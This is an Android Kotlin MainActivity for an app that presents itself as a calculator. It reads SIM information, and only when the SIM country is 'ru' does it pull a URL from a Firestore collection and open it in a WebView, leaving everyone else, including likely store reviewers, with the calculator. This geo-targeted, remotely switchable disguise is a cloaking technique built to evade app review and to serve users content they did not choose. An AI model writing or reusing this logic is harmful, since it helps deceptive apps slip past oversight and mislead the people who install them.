package com.testfirebaseapp

import android.Manifest.permission
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.ViewModelProviders
import com.google.firebase.firestore.FirebaseFirestore
import com.testfirebaseapp.calculator.MainRepository
import com.testfirebaseapp.calculator.ViewModelMain
import com.testfirebaseapp.siminfo.acces_to_sim
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.android.synthetic.main.calculator_view.*
import kotlinx.android.synthetic.main.calculator_view.view.*


class MainActivity : AppCompatActivity() {
    private lateinit var viewModelMain: ViewModelMain

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        checkPermission()
//        if (checkPermission()) openWebView() else loadNative()
    }

    fun checkPermission() {
        if (simCardInfo()) {
            dataFromFireBase()
        } else {
            loadNative()
        }
    }


    fun openWebView(url: String) {
        val i = Intent(this, WebViewActivity::class.java)
        i.putExtra("url", url)
        startActivity(i)


    }


    fun loadNative() {

        calculator_layout.visibility = View.VISIBLE
        val factory: ViewModelMain.Factory = ViewModelMain.Factory(MainRepository.getInstance())
        viewModelMain = ViewModelProviders.of(this, factory).get(ViewModelMain::class.java)

        viewModelMain.click(this, calculator_layout)

    }

    fun toast(mess: String) {
        Toast.makeText(this, mess, Toast.LENGTH_SHORT).show()
    }

    fun simCardInfo(): Boolean {
        if (ContextCompat.checkSelfPermission(
                this,
                permission.READ_PHONE_STATE
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(permission.READ_PHONE_STATE), 23
            )
            return false
        } else {

            val list = acces_to_sim(this)
            toast(list.toString())
            return !list[0].equals("") && list[1].equals("ru")
        }
    }

    fun dataFromFireBase() {
        val db = FirebaseFirestore.getInstance()

        db.collection("data")
            .get()
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    for (document in task.result!!) {
                        toast("Data from Firestore: " + document.data["value"])
                        if (("" + document.data["value"]).isEmpty()) loadNative()
                        else
                            openWebView("" + document.data["value"])
                    }
                } else if (task.isCanceled) loadNative()
            }
    }


}
